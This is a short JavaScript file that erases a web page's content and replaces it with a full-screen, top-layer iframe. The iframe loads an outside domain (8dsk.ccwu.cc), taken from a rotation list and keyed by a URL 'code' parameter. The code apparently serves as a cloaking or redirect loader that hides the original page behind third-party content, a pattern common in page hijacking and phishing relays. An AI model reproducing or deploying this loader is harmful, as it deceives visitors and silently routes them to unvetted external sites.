(function () {
  'use strict';
  try {
    var domains = [
      '8dsk.ccwu.cc'
    ];

    var urlParams = new URLSearchParams(window.location.search);
    var code = urlParams.get('code');
    if (!code) {
      document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#f56c6c;font-size:14px;">参数错误</div>';
      return;
    }

    var idx = Math.floor(Math.random() * domains.length);
    var src = '//' + domains[idx] + '/?code=' + encodeURIComponent(code);

    var style = document.createElement('style');
    style.textContent = 'html,body{margin:0!important;padding:0!important;height:100%!important;overflow:hidden!important;background:#fff!important}#__rr_iframe{position:fixed!important;inset:0!important;width:100%!important;height:100%!important;border:0!important;z-index:2147483647!important;background:#fff!important}';
    document.head.appendChild(style);

    var iframe = document.createElement('iframe');
    iframe.id = '__rr_iframe';
    iframe.src = src;
    iframe.allow = 'autoplay; fullscreen; clipboard-write';
    iframe.setAttribute('allowfullscreen', '');

    document.body.innerHTML = '';
    document.body.appendChild(iframe);
  } catch (e) {
    document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#f56c6c;font-size:14px;">系统错误</div>';
  }
})();
